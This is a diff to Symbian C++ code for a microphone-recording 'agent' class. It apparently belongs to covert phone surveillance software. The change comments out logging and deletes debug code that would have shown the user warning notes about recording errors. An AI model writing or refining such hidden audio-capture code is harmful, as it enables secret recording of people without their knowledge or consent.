@@ -134,7 +134,7 @@ void CAgentMic::ConstructL(const TDesC8& params)
 
 void CAgentMic::StartAgentCmdL()
 	{
-	__FLOG(_L("StartAgentCmdL()"));
+	//__FLOG(_L("StartAgentCmdL()"));
 	
 	iCallMonitor->StartListeningForEvents();
 	iFreeSpaceMonitor->StartListeningForEvents();
@@ -164,7 +164,7 @@ void CAgentMic::StartAgentCmdL()
 
 void CAgentMic::StopAgentCmdL()
 	{
-	__FLOG(_L("StopAgentCmdL()"));
+	//__FLOG(_L("StopAgentCmdL()"));
 	
 	iTimer->Cancel();
 	iCallMonitor->Cancel();
@@ -242,19 +242,6 @@ void CAgentMic::MaiscOpenComplete(TInt aError)
 
 void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
     {
-	// TODO: delete when done - begin
-	/*
-		if(aError!=KErrNone)
-			{
-			CAknGlobalNote* note = CAknGlobalNote::NewLC();
-			_LIT(KFormat, "MaiscBufferCopied error: %d");
-			TBuf<128> msg;
-			msg.AppendFormat(KFormat,aError);
-			note->ShowNoteL(EAknGlobalWarningNote, msg);
-			CleanupStack::PopAndDestroy(note);
-			}
-			*/	
-	// end
 		
 	if (aError==KErrNone && iInputStream) 
 	    {
@@ -311,20 +298,6 @@ void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
  */
 void CAgentMic::MaiscRecordComplete(TInt aError)
     {
-	// show a note to the user
-	// TODO: delete when done  - begin
-	/*
-	if(aError!=KErrNone)
-		{
-		CAknGlobalNote* note = CAknGlobalNote::NewLC();
-		_LIT(KFormat, "MaiscRecordComplete error: %d");
-		TBuf<128> msg;
-		msg.AppendFormat(KFormat,aError);
-		note->ShowNoteL(EAknGlobalWarningNote, msg);
-		CleanupStack::PopAndDestroy(note);
-		}
-		*/	
-	// end
 	
 	if (aError == KErrNone) 
         {
@@ -387,19 +360,8 @@ void CAgentMic::TimerExpiredL(TAny* src)
 
 void CAgentMic::RestartRecording()
 	{
-	// show a note to the user
-	// TODO: delete when done  - begin
-	/*
-	CAknGlobalNote* note = CAknGlobalNote::NewLC();
-	_LIT(KFormat, "RestartRecording");
-	note->ShowNoteL(EAknGlobalWarningNote, KFormat);
-	CleanupStack::PopAndDestroy(note);
-	*/
-	// end
-	
 	iInputStream->ReadL(*iStreamBufferArray[0]);
 	iInputStream->ReadL(*iStreamBufferArray[1]);
-		
 	}
 
 void CAgentMic::NotifyAboveThreshold()
